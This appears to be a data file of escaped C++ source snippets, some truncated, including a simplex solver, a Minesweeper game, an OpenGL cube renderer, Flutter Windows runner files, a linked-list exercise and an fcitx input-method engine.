simplex(double tabla[numRestricciones + 1][numVariables + numRestricciones + 1]) {\n    int filas = numRestricciones + 1; // N\u00famero de filas en la tabla\n    int columnas = numVariables + numRestricciones + 1; // N\u00famero de columnas en la tabla\n\n    // Iniciar el bucle principal del algoritmo simplex\n    while (true) {\n        // Encontrar la columna pivote (la m\u00e1s negativa en la fila objetivo)\n        int colPivote = -1; // \u00cdndice de la columna pivote\n        double minVal = 0; // Valor m\u00ednimo en la fila objetivo\n\n        // Iterar sobre cada columna en la fila objetivo\n        for (int j = 0; j < columnas - 1; ++j) {\n            // Buscar la columna con el valor m\u00e1s negativo en la fila objetivo\n            if (tabla[filas - 1][j] < minVal) {\n                minVal = tabla[filas - 1][j]; // Actualizar el valor m\u00ednimo\n                colPivote = j; // Actualizar el \u00edndice de la columna pivote\n            }\n        }\n\n        // Verificar si todas las entradas en la fila objetivo son no negativas\n        if (colPivote == -1) break; // Salir del bucle si todas son no negativas\n\n        // Encontrar la fila pivote usando la regla de raz\u00f3n m\u00ednima\n        int filPivote = -1; // \u00cdndice de la fila pivote\n        double minRazon = 1.0e30; // Valor inicial para la raz\u00f3n m\u00ednima (casi infinito)\n\n        // Iterar sobre cada fila, excepto la \u00faltima (la fila objetivo)\n        for (int i = 0; i < filas - 1; ++i) {\n            // Verificar si el elemento en la columna pivote es positivo\n            if (tabla[i][colPivote] > 0) {\n                // Calcular la raz\u00f3n entre el valor en la columna de resultados y el valor en la columna pivote\n                double razon = tabla[i][columnas - 1] / tabla[i][colPivote];\n                // Actualizar la fila pivote si la raz\u00f3n es menor que la m\u00ednima encontrada hasta ahora\n                if (razon < minRazon) {\n                    minRazon = razon; // Actualizar la raz\u00f3n m\u00ednima\n                    filPivote = i; // Actualizar el \u00edndice de la fila pivote\n                }\n            }\n        }\n\n        // Verificar si no se puede encontrar una fila pivote v\u00e1lida\n        if (filPivote == -1) {\n            // Imprimir un mensaje de error y salir de la funci\u00f3n\n            cout << \"Problema sin soluci\u00f3n acotada\" << endl;\n            return;\n        }\n\n        // Hacer que el pivote sea igual a 1 en la fila pivote\n        double pivote = tabla[filPivote][colPivote]; // Valor del pivote\n\n        // Iterar sobre cada elemento en la fila pivote y dividirlo por el pivote\n        for (int j = 0; j < columnas; ++j) {\n            tabla[filPivote][j] /= pivote;\n        }\n\n        // Hacer ceros en la columna pivote en todas las filas excepto la fila pivote\n        for (int i = 0; i < filas; ++i) {\n            // Saltar la fila pivote\n            if (i != filPivote) {\n                // Calcular el factor de multiplicaci\u00f3n\n                double factor = tabla[i][colPivote];\n                // Iterar sobre cada elemento en la fila y restar el producto del factor y el elemento correspondiente en la fila pivote\n                for  (int j = 0; j < columnas; ++j) {\n                    tabla[i][j] -= factor * tabla[filPivote][j];\n                }\n            }\n        }\n\n        // Imprimir la tabla en cada iteraci\u00f3n\n        imprimirTabla(tabla);\n    }\n\n    // Imprimir la soluci\u00f3n \u00f3ptima despu\u00e9s de salir del bucle principal\n    cout << \"Soluci\u00f3n Optima: \" << tabla[filas - 1][columnas - 1] << endl;\n}\n\n// Funci\u00f3n principal del programa\nint main() {\n    // Inicializar la tabla con valores dados en el problema\n    double tabla[numRestricciones + 1][numVariables + numRestricciones + 1] =\n    {\n        {2, 1, 1, 0, 6}, // L1\n        {1, -1, 0, 1, 0}, // L2\n        {-5, -1, 0, 0, 0} // L0\n\n    };\n\n//  Ejemplo de Cuaderno (RESPUESTA: 8) (Cambiar variables de VARIABLES y RESTRICCIONES a 2, 3  respectivamente)\n//    {\n//        {-2, 3, 1, 0, 0, 6}, //L1\n//        {1, 2, 0, 1, 0, 8}, // L2\n//        {1, 1",
    "\r\n// Test_SG_PNGView.cpp : Defines the class behaviors for the application.\r\n//\r\n\r\n#include \"pch.h\"\r\n#include \"framework.h\"\r\n#include \"Test_SG_PNGView.h\"\r\n#include \"Test_SG_PNGViewDlg.h\"\r\n\r\n#include <gdiplus.h>\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\n\r\n// CTest_SG_PNGViewApp\r\n\r\nBEGIN_MESSAGE_MAP(CTest_SG_PNGViewApp, CWinApp)\r\n\tON_COMMAND(ID_HELP, &CWinApp::OnHelp)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\n// CTest_SG_PNGViewApp construction\r\n\r\nCTest_SG_PNGViewApp::CTest_SG_PNGViewApp()\r\n{\r\n\t// support Restart Manager\r\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;\r\n\r\n\t// TODO: add construction code here,\r\n\t// Place all significant initialization in InitInstance\r\n}\r\n\r\n\r\n// The one and only CTest_SG_PNGViewApp object\r\n\r\nCTest_SG_PNGViewApp theApp;\r\n\r\n\r\n\r\n// CTest_SG_PNGViewApp initialization\r\n\r\nBOOL CTest_SG_PNGViewApp::InitInstance()\r\n{\r\n\r\n\r\n\t// InitCommonControlsEx() is required on Windows XP if an application\r\n\t// manifest specifies use of ComCtl32.dll version 6 or later to enable\r\n\t// visual styles.  Otherwise, any window creation will fail.\r\n\tINITCOMMONCONTROLSEX InitCtrls;\r\n\tInitCtrls.dwSize = sizeof(InitCtrls);\r\n\t// Set this to include all the common control classes you want to use\r\n\t// in your application.\r\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\r\n\tInitCommonControlsEx(&InitCtrls);\r\n\r\n\tCWinApp::InitInstance();\r\n\r\n\r\n\tAfxEnableControlContainer();\r\n\r\n\t// Create the shell manager, in case the dialog contains\r\n\t// any shell tree view or shell list view controls.\r\n\tCShellManager *pShellManager = new CShellManager;\r\n\r\n\t// Activate \"Windows Native\" visual manager for enabling themes in MFC controls\r\n\tCMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));\r\n\r\n\t// Standard initialization\r\n\t// If you are not using these features and wish to reduce the size\r\n\t// of your final executable, you should remove from the following\r\n\t// the specific initialization routines you do not need\r\n\t// Change the registry key under which our settings are stored\r\n\t// TODO: You should modify this string to be something appropriate\r\n\t// such as the name of your company or organization\r\n\tSetRegistryKey(_T(\"Local AppWizard-Generated Applications\"));\r\n\r\n\tCTest_SG_PNGViewDlg dlg;\r\n\tm_pMainWnd = &dlg;\r\n\tINT_PTR nResponse = dlg.DoModal();\r\n\tif (nResponse == IDOK)\r\n\t{\r\n\t\t// TODO: Place code here to handle when the dialog is\r\n\t\t//  dismissed with OK\r\n\t}\r\n\telse if (nResponse == IDCANCEL)\r\n\t{\r\n\t\t// TODO: Place code here to handle when the dialog is\r\n\t\t//  dismissed with Cancel\r\n\t}\r\n\telse if (nResponse == -1)\r\n\t{\r\n\t\tTRACE(traceAppMsg, 0, \"Warning: dialog creation failed, so application is terminating unexpectedly.\\n\");\r\n\t\tTRACE(traceAppMsg, 0, \"Warning: if you are using MFC controls on the dialog, you cannot #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS.\\n\");\r\n\t}\r\n\r\n\t// Delete the shell manager created above.\r\n\tif (pShellManager != nullptr)\r\n\t{\r\n\t\tdelete pShellManager;\r\n\t}\r\n\r\n#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)\r\n\tControlBarCleanUp();\r\n#endif\r\n\r\n\t// Since the dialog has been closed, return FALSE so that we exit the\r\n\t//  application, rather than start the application's message pump.\r\n\treturn FALSE;\r\n}\r\n\r\n",
    "// A C++ Program to Implement and Play Minesweeper\n\n#include<bits/stdc++.h>\nusing namespace std;\n\n#define BEGINNER 0\n#define INTERMEDIATE 1\n#define ADVANCED 2\n#define MAXSIDE 25\n#define MAXMINES 99\n#define MOVESIZE 526 // (25 * 25 - 99)\n\nint SIDE ; // side length of the board\nint MINES ; // number of mines on the board\n\n// A Utility Function to check whether given cell (row, col)\n// is a valid cell or not\nbool isValid(int row, int col)\n{\n\t// Returns true if row number and column number\n\t// is in range\n\treturn (row >= 0) && (row < SIDE) &&\n\t\t(col >= 0) && (col < SIDE);\n}\n\n// A Utility Function to check whether given cell (row, col)\n// has a mine or not.\nbool isMine (int row, int col, char board[][MAXSIDE])\n{\n\tif (board[row][col] == '*')\n\t\treturn (true);\n\telse\n\t\treturn (false);\n}\n\n// A Function to get the user's move\nvoid makeMove(int *x, int *y)\n{\n\t// Take the input move\n\tprintf(\"Enter your move, (row, column) -> \");\n\tscanf(\"%d %d\", x, y);\n\treturn;\n}\n\n// A Function to print the current gameplay board\nvoid printBoard(char myBoard[][MAXSIDE])\n{\n\tint i, j;\n\n\tprintf (\" \");\n\n\tfor (i=0; i<SIDE; i++)\n\t\tprintf (\"%d \", i);\n\n\tprintf (\"\\n\\n\");\n\n\tfor (i=0; i<SIDE; i++)\n\t{\n\t\tprintf (\"%d \", i);\n\n\t\tfor (j=0; j<SIDE; j++)\n\t\t\tprintf (\"%c \", myBoard[i][j]);\n\t\tprintf (\"\\n\");\n\t}\n\treturn;\n}\n\n// A Function to count the number of\n// mines in the adjacent cells\nint countAdjacentMines(int row, int col, int mines[][2],\n\t\t\t\t\tchar realBoard[][MAXSIDE])\n{\n\n\tint i;\n\tint count = 0;\n\n\t/*\n\t\tCount all the mines in the 8 adjacent\n\t\tcells\n\n\t\t\tN.W N N.E\n\t\t\t\\ | /\n\t\t\t\\ | /\n\t\t\tW----Cell----E\n\t\t\t\t/ | \\\n\t\t\t/ | \\\n\t\t\tS.W S S.E\n\n\t\tCell-->Current Cell (row, col)\n\t\tN --> North\t (row-1, col)\n\t\tS --> South\t (row+1, col)\n\t\tE --> East\t\t (row, col+1)\n\t\tW --> West\t\t (row, col-1)\n\t\tN.E--> North-East (row-1, col+1)\n\t\tN.W--> North-West (row-1, col-1)\n\t\tS.E--> South-East (row+1, col+1)\n\t\tS.W--> South-West (row+1, col-1)\n\t*/\n\n\t//----------- 1st Neighbour (North) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row-1, col) == true)\n\t\t{\n\t\t\tif (isMine (row-1, col, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 2nd Neighbour (South) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row+1, col) == true)\n\t\t{\n\t\t\tif (isMine (row+1, col, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 3rd Neighbour (East) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row, col+1) == true)\n\t\t{\n\t\t\tif (isMine (row, col+1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 4th Neighbour (West) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row, col-1) == true)\n\t\t{\n\t\t\tif (isMine (row, col-1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 5th Neighbour (North-East) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row-1, col+1) == true)\n\t\t{\n\t\t\tif (isMine (row-1, col+1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 6th Neighbour (North-West) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row-1, col-1) == true)\n\t\t{\n\t\t\tif (isMine (row-1, col-1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 7th Neighbour (South-East) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row+1, col+1) == true)\n\t\t{\n\t\t\tif (isMine (row+1, col+1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\t//----------- 8th Neighbour (South-West) ------------\n\n\t\t// Only process this cell if this is a valid one\n\t\tif (isValid (row+1, col-1) == true)\n\t\t{\n\t\t\tif (isMine (row+1, col-1, realBoard) == true)\n\t\t\tcount++;\n\t\t}\n\n\treturn (count);\n}\n\n// A Recursive Function to play the Minesweeper Game\nbool playMinesweeperUtil(char myBoard[][MAXSIDE], char realBoard[][MAXSIDE],\n\t\t\tint mines[][2], int row, int col, int *movesLeft)\n{\n\n\t// Base Case of Recursion\n\tif (myBoard[row][col] != '-')\n\t\treturn (false);\n\n\tint i, j;\n\n\t// You opened a mine\n\t// You are going to lose\n\tif (realBoard[row][col] == '*')\n\t{\n\t\tmyBoard[row][col]='*';\n\n\t\tfor (i=0; i<MINES; i++)\n\t\t\tmyBoard[mines[i][0]][mines[i][1]]='*';\n\n\t\tprintBoard (myBoard);\n\t\tprintf (\"\\nYou lost!\\n\");\n\t\treturn (true) ;\n\t}\n\n\telse\n\t{\n\t\t// Calculate the number of adjacent mines and put it\n\t\t// on the board\n\t\tint count = countAdjacentMines(row, col, mines, realBoard);\n\t\t(*movesLeft)--;\n\n\t\tmyBoard[row][col] = count + '0';\n\n\t\tif (!count)\n\t\t{\n\t\t\t/*\n\t\t\tRecur for all 8 adjacent cells\n\n\t\t\t\tN.W N N.E\n\t\t\t\t\\ | /\n\t\t\t\t\t\\ | /\n\t\t\t\tW----Cell----E\n\t\t\t\t\t/ | \\\n\t\t\t\t/ | \\\n\t\t\t\tS.W S S.E\n\n\t\t\tCell-->Current Cell (row, col)\n\t\t\tN --> North\t (row-1, col)\n\t\t\tS --> South\t (row+1, col)\n\t\t\tE --> East\t\t (row, col+1)\n\t\t\tW --> West\t\t (row, col-1)\n\t\t\tN.E--> North-East (row-1, col+1)\n\t\t\tN.W--> North-West (row-1, col-1)\n\t\t\tS.E--> South-East (row+1, col+1)\n\t\t\tS.W--> South-West (row+1, col-1)\n\t\t\t*/\n\n\t\t\t\t//----------- 1st Neighbour (North) ------------\n\n\t\t\t// Only process this cell if this is a valid one\n\t\t\tif (isValid (row-1, col) == true)\n\t\t\t{\n\t\t\t\tif (isMine (row-1, col, realBoard) == false)\n\t\t\t\tplayMinesweeperUtil",
    "#include \"entity.h\"\n\nEntity::Entity() :\nvertices{\n    // Triangles         // Colors\n    -0.5f, -0.5f, -0.5f, 1.f, 0.f, 0.f,\n     0.5f, -0.5f, -0.5f, 1.f, 0.f, 0.f,\n     0.5f,  0.5f, -0.5f, 1.f, 0.f, 0.f,\n     0.5f,  0.5f, -0.5f, 1.f, 0.f, 0.f,\n    -0.5f,  0.5f, -0.5f, 1.f, 0.f, 0.f,\n    -0.5f, -0.5f, -0.5f, 1.f, 0.f, 0.f,\n\n    -0.5f, -0.5f,  0.5f, 1.f, 0.1f, 0.f,\n     0.5f, -0.5f,  0.5f, 1.f, 0.1f, 0.f,\n     0.5f,  0.5f,  0.5f, 1.f, 0.1f, 0.f,\n     0.5f,  0.5f,  0.5f, 1.f, 0.1f, 0.f,\n    -0.5f,  0.5f,  0.5f, 1.f, 0.1f, 0.f,\n    -0.5f, -0.5f,  0.5f, 1.f, 0.1f, 0.f,\n\n    -0.5f,  0.5f,  0.5f, 1.f, 0.1f, 0.1f,\n    -0.5f,  0.5f, -0.5f, 1.f, 0.1f, 0.1f,\n    -0.5f, -0.5f, -0.5f, 1.f, 0.1f, 0.1f,\n    -0.5f, -0.5f, -0.5f, 1.f, 0.1f, 0.1f,\n    -0.5f, -0.5f,  0.5f, 1.f, 0.1f, 0.1f,\n    -0.5f,  0.5f,  0.5f, 1.f, 0.1f, 0.1f,\n\n     0.5f,  0.5f,  0.5f, 1.f, 0.2f, 0.2f,\n     0.5f,  0.5f, -0.5f, 1.f, 0.2f, 0.2f,\n     0.5f, -0.5f, -0.5f, 1.f, 0.2f, 0.2f,\n     0.5f, -0.5f, -0.5f, 1.f, 0.2f, 0.2f,\n     0.5f, -0.5f,  0.5f, 1.f, 0.2f, 0.2f,\n     0.5f,  0.5f,  0.5f, 1.f, 0.2f, 0.2f,\n\n    -0.5f, -0.5f, -0.5f, 1.f, 0.3f, 0.1f,\n     0.5f, -0.5f, -0.5f, 1.f, 0.3f, 0.1f,\n     0.5f, -0.5f,  0.5f, 1.f, 0.3f, 0.1f,\n     0.5f, -0.5f,  0.5f, 1.f, 0.3f, 0.1f,\n    -0.5f, -0.5f,  0.5f, 1.f, 0.3f, 0.1f,\n    -0.5f, -0.5f, -0.5f, 1.f, 0.3f, 0.1f,\n\n    -0.5f,  0.5f, -0.5f, 1.f, 0.3f, 0.3f,\n     0.5f,  0.5f, -0.5f, 1.f, 0.3f, 0.3f,\n     0.5f,  0.5f,  0.5f, 1.f, 0.3f, 0.3f,\n     0.5f,  0.5f,  0.5f, 1.f, 0.3f, 0.3f,\n    -0.5f,  0.5f,  0.5f, 1.f, 0.3f, 0.3f,\n    -0.5f,  0.5f, -0.5f, 1.f, 0.3f, 0.3f\n}\n{\n    this->isMoving = false;\n    this->movementAngle = 0.f;\n    this->direction = Direction::NONE;\n\n    this->projection = glm::mat4(1.f);\n    this->model = glm::mat4(1.f);\n    this->view = glm::mat4(1.f);\n    this->projection = glm::perspective(glm::radians(45.f), (float)1280/(float)720, 0.1f, 100.f);\n    this->model = glm::rotate(model, glm::radians(-90.f), glm::vec3(1.f, 0.f, 0.f));\n    this->view = glm::translate(view, glm::vec3(0.f, 0.f, -10.f));\n\n    glGenVertexArrays(1, &this->VAO);\n    glGenBuffers(1, &this->VBO);\n    glBindVertexArray(VAO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n    glVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(float), (void*)(3*sizeof(float)));\n    glEnableVertexAttribArray(1);\n\n    shader = new Shader(\"src/shaders/vertex.vs\", \"src/shaders/fragment.fs\");\n}\n\nvoid Entity::update(float deltaTime)\n{\n    if (this->direction == Direction::NONE) return;\n\n    this->isMoving = true;\n    this->movementAngle += deltaTime * 3;\n\n    switch (this->direction)\n    {\n    case Direction::NORTH:\n        model = glm::rotate(model, deltaTime*3, glm::vec3(-1.0f, 0.0f, 0.0f));\n        view = glm::translate(view, glm::vec3(0.f, deltaTime*3, 0.0f));\n        break;\n    case Direction::SOUTH:\n        model = glm::rotate(model, deltaTime*3, glm::vec3(1.0f, 0.0f, 0.0f));\n        view = glm::translate(view, glm::vec3(0.f, -deltaTime*3, 0.0f));\n        break;\n    case Direction::EAST:\n        model = glm::rotate(model, deltaTime*3, glm::vec3(0.0f, 1.0f, 0.0f));\n        view = glm::translate(view, glm::vec3(deltaTime*3, 0.f, 0.f));\n        break;\n    case Direction::WEST:\n        model = glm::rotate(model, deltaTime*3, glm::vec3(0.0f, -1.0f, 0.f));\n        view = glm::translate(view, glm::vec3(-deltaTime*3, 0.f, 0.f));\n        break;\n    default:\n        break;\n    }\n\n    if (this->movementAngle >= glm::radians(90.0f))\n    {\n        this->isMoving = false;\n        this->movementAngle = 0;\n        this->direction = Direction::NONE;\n    }\n}\n\nvoid Entity::draw()\n{\n    shader->use();\n    shader->set_mat4(\"model\", this->model);\n    shader->set_mat4(\"view\", this->view);\n    shader->set_mat4(\"projection\", this->projection);\n    \n    glBindVertexArray(this->VAO);\n    glDrawArrays(GL_TRIANGLES, 0, 36);\n}\n\nvoid Entity::set_direction(Direction direction)\n{\n    this->direction = direction;\n}\n\nvoid Entity::reset_direction()\n{\n    if (isMoving) return;\n    \n    this->model = glm::mat4(1.0f);\n\n    this->direction = Direction::NONE;\n}\n\nbool Entity::is_moving() \n{\n    return this->isMoving;\n}",
    "#include \"win32_window.h\"\r\n\r\n#include <dwmapi.h>\r\n#include <flutter_windows.h>\r\n\r\n#include \"resource.h\"\r\n\r\nnamespace {\r\n\r\n/// Window attribute that enables dark mode window decorations.\r\n///\r\n/// Redefined in case the developer's machine has a Windows SDK older than\r\n/// version 10.0.22000.0.\r\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\r\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\r\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\r\n#endif\r\n\r\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\r\n\r\n/// Registry key for app theme preference.\r\n///\r\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\r\n/// value indicates apps should use light mode.\r\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\r\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\r\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\r\n\r\n// The number of Win32Window objects that currently exist.\r\nstatic int g_active_window_count = 0;\r\n\r\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\r\n\r\n// Scale helper to convert logical scaler values to physical using passed in\r\n// scale factor\r\nint Scale(int source, double scale_factor) {\r\n  return static_cast<int>(source * scale_factor);\r\n}\r\n\r\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\r\n// This API is only needed for PerMonitor V1 awareness mode.\r\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\r\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\r\n  if (!user32_module) {\r\n    return;\r\n  }\r\n  auto enable_non_client_dpi_scaling =\r\n      reinterpret_cast<EnableNonClientDpiScaling*>(\r\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\r\n  if (enable_non_client_dpi_scaling != nullptr) {\r\n    enable_non_client_dpi_scaling(hwnd);\r\n  }\r\n  FreeLibrary(user32_module);\r\n}\r\n\r\n}  // namespace\r\n\r\n// Manages the Win32Window's window class registration.\r\nclass WindowClassRegistrar {\r\n public:\r\n  ~WindowClassRegistrar() = default;\r\n\r\n  // Returns the singleton registrar instance.\r\n  static WindowClassRegistrar* GetInstance() {\r\n    if (!instance_) {\r\n      instance_ = new WindowClassRegistrar();\r\n    }\r\n    return instance_;\r\n  }\r\n\r\n  // Returns the name of the window class, registering the class if it hasn't\r\n  // previously been registered.\r\n  const wchar_t* GetWindowClass();\r\n\r\n  // Unregisters the window class. Should only be called if there are no\r\n  // instances of the window.\r\n  void UnregisterWindowClass();\r\n\r\n private:\r\n  WindowClassRegistrar() = default;\r\n\r\n  static WindowClassRegistrar* instance_;\r\n\r\n  bool class_registered_ = false;\r\n};\r\n\r\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\r\n\r\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\r\n  if (!class_registered_) {\r\n    WNDCLASS window_class{};\r\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\r\n    window_class.lpszClassName = kWindowClassName;\r\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\r\n    window_class.cbClsExtra = 0;\r\n    window_class.cbWndExtra = 0;\r\n    window_class.hInstance = GetModuleHandle(nullptr);\r\n    window_class.hIcon =\r\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\r\n    window_class.hbrBackground = 0;\r\n    window_class.lpszMenuName = nullptr;\r\n    window_class.lpfnWndProc = Win32Window::WndProc;\r\n    RegisterClass(&window_class);\r\n    class_registered_ = true;\r\n  }\r\n  return kWindowClassName;\r\n}\r\n\r\nvoid WindowClassRegistrar::UnregisterWindowClass() {\r\n  UnregisterClass(kWindowClassName, nullptr);\r\n  class_registered_ = false;\r\n}\r\n\r\nWin32Window::Win32Window() {\r\n  ++g_active_window_count;\r\n}\r\n\r\nWin32Window::~Win32Window() {\r\n  --g_active_window_count;\r\n  Destroy();\r\n}\r\n\r\nbool Win32Window::Create(const std::wstring& title,\r\n                         const Point& origin,\r\n                         const Size& size) {\r\n  Destroy();\r\n\r\n  const wchar_t* window_class =\r\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\r\n\r\n  const POINT target_point = {static_cast<LONG>(origin.x),\r\n                              static_cast<LONG>(origin.y)};\r\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\r\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\r\n  double scale_factor = dpi / 96.0;\r\n\r\n  HWND window = CreateWindow(\r\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\r\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\r\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\r\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\r\n\r\n  if (!window) {\r\n    return false;\r\n  }\r\n\r\n  UpdateTheme(window);\r\n\r\n  return OnCreate();\r\n}\r\n\r\nbool Win32Window::Show() {\r\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\r\n}\r\n\r\n// static\r\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\r\n                                      UINT const message,\r\n                                      WPARAM const wparam,\r\n              ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\nstruct Node{\n    double data;\n    Node *next;\n};\n\nstruct LinkedList{\n    Node *head;\n    Node *tail;\n};\n\nNode* createNode(double x);\n\nNode* createNode(double x){\n    Node *p = new Node;\n    p->data = x;\n    p->next = NULL;\n    return p;\n}\n\nvoid init(LinkedList &lst){\n    lst.head = NULL;\n    lst.tail = NULL;\n}\n\nvoid insertTail(LinkedList &lst, double x){\n    Node *p = createNode(x);\n    if(lst.head == NULL){\n        lst.head = lst.tail = p;\n    } else {\n        lst.tail->next = p;\n        lst.tail = p;\n    }\n}\n\nvoid removeHead(LinkedList &lst){\n    Node *cur = lst.head;\n    if(cur != NULL){\n        lst.head = lst.head->next;\n        delete cur;\n    }\n}\n\nvoid removeAfter(Node *prev, Node *cur){\n    prev->next = cur->next;\n    delete cur;\n}\n\nvoid removeAll(LinkedList &lst){\n    while(lst.head != NULL){\n        Node *cur = lst.head;\n        lst.head = lst.head->next;\n        delete cur;\n    }\n    lst.tail = NULL;\n}\n\nNode* secondMax(LinkedList lst){\n    Node *null_result = createNode(-1);\n    if(lst.head == NULL){\n        return null_result;\n    }\n    if(lst.head->next == NULL){\n        return null_result;\n    }\n    \n    Node *cur = lst.head->next;\n    Node *max;\n    Node *secondmax = createNode(-1);\n\n    if(lst.head->data > lst.head->next->data){\n        max = createNode(lst.head->data);\n        secondmax = createNode(lst.head->next->data);\n    } else if(lst.head->data < lst.head->next->data){\n        secondmax = createNode(lst.head->data);\n        max = createNode(lst.head->next->data);\n    } else {\n        max = createNode(lst.head->data);\n    }\n    cur = cur->next;\n    while(cur != NULL){\n        if(cur->data != max->data){\n            if(cur->data > max->data){\n                secondmax = max;\n                max = cur;\n            } else {\n                if(cur->data > secondmax->data){\n                    secondmax = cur;\n                }\n            }\n        }\n        cur = cur->next;\n    }\n    return secondmax;\n}\n\nint main(){\n    LinkedList lst;\n    init(lst);\n    double x1;\n    cin >> x1;\n    while(x1 != -1){\n        insertTail(lst, x1);\n        cin >> x1;\n    }\n\n    cout << secondMax(lst)->data;\n\n    removeAll(lst);\n}",
    "#include \"hazkey.h\"\n\n#include \"hazkey_state.h\"\n\nnamespace fcitx {\n\nHazkeyEngine::HazkeyEngine(Instance *instance)\n    : instance_(instance), factory_([this](InputContext &ic) {\n          return new HazkeyState(this, &ic);\n      }) {\n    instance->inputContextManager().registerProperty(\"hazkeyState\", &factory_);\n    kkcConfig_ =\n        kkc_get_config(*config().zenzaiEnabled, *config().zenzaiInferenceLimit,\n                       static_cast<int>(*config().numberStyle),\n                       static_cast<int>(*config().symbolStyle),\n                       static_cast<int>(*config().periodStyle),\n                       static_cast<int>(*config().commaStyle),\n                       static_cast<int>(*config().spaceStyle),\n                       static_cast<int>(*config().diacriticStyle),\n                       static_cast<int>(*config().autoCommitMode));\n    reloadConfig();\n}\n\nvoid HazkeyEngine::keyEvent(const InputMethodEntry &entry, KeyEvent &keyEvent) {\n    FCITX_UNUSED(entry);\n    if (keyEvent.isRelease()) {\n        return;\n    }\n    FCITX_DEBUG() << \"keyEvent: \" << keyEvent.key().toString();\n\n    auto inputContext = keyEvent.inputContext();\n    inputContext->propertyFor(&factory_)->keyEvent(keyEvent);\n    inputContext->updatePreedit();\n    inputContext->updateUserInterface(UserInterfaceComponent::InputPanel);\n}\n\nvoid HazkeyEngine::activate(const InputMethodEntry &entry,\n                            InputContextEvent &event) {\n    FCITX_UNUSED(entry);\n    FCITX_DEBUG() << \"HazkeyEngine activate\";\n    auto inputContext = event.inputContext();\n    auto state = inputContext->propertyFor(&factory_);\n    state->reset();\n    inputContext->updatePreedit();\n    